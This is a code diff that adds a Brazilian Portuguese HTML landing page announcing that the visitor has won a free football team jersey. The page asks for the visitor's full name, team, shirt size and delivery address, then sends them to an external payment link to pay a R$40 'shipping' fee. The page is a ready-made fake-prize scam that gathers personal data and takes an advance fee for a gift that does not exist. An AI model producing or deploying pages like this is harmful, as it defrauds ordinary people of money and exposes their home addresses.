@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ganhe Sua Camisa do Time! 🎉</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ffcc00;
+            padding: 20px;
+            text-align: center;
+            font-size: 24px;
+            color: #fff;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .form-section {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-section h2 {
+            margin-bottom: 20px;
+        }
+        .form-section label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        .form-section input, .form-section select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .form-section button {
+            padding: 15px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .form-section button:hover {
+            background-color: #218838;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #222;
+            color: white;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        🎉 Parabéns! Você ganhou uma camisa grátis do seu time! 🎉
+    </header>
+
+    <div class="container">
+        <div class="form-section">
+            <h2>Responda as perguntas para garantir sua camisa! <br><small>O frete é R$40 e você paga apenas isso.</small></h2>
+
+            <form action="https://pag.ae/7_8TH9enL" method="GET" target="_blank">
+                <!-- Pergunta 1: Nome -->
+                <label for="nome">1. Qual o seu nome completo?</label>
+                <input type="text" id="nome" name="nome" required>
+
+                <!-- Pergunta 2: Time favorito -->
+                <label for="time">2. Qual é o seu time favorito?</label>
+                <select id="time" name="time" required>
+                    <option value="flamengo">Flamengo</option>
+                    <option value="palmeiras">Palmeiras</option>
+                    <option value="saopaulo">São Paulo</option>
+                    <option value="corinthians">Corinthians</option>
+                    <option value="outro">Outro</option>
+                </select>
+
+                <!-- Pergunta 3: Tamanho da camisa -->
+                <label for="tamanho">3. Qual tamanho de camisa você usa?</label>
+                <select id="tamanho" name="tamanho" required>
+                    <option value="p">P</option>
+                    <option value="m">M</option>
+                    <option value="g">G</option>
+                    <option value="gg">GG</option>
+                </select>
+
+                <!-- Pergunta 4: Personalização -->
+                <label for="personalizar">4. Você gostaria de personalizar a camisa com seu nome ou número?</label>
+                <select id="personalizar" name="personalizar" required>
+                    <option value="sim">Sim</option>
+                    <option value="nao">Não</option>
+                </select>
+
+                <!-- Pergunta 5: Endereço -->
+                <label for="endereco">5. Qual é o seu endereço de entrega?</label>
+                <input type="text" id="endereco" name="endereco" required>
+
+                <!-- Texto informativo sobre o pagamento -->
+                <p><strong>A camisa é grátis, mas você precisa pagar apenas o frete no valor de R$40.</strong></p>
+
+                <!-- Botão de envio -->
+                <button type="submit">Finalizar Pedido e Pagar Frete</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2024 - Todos os direitos reservados
+    </footer>
+
+</body>
+</html>
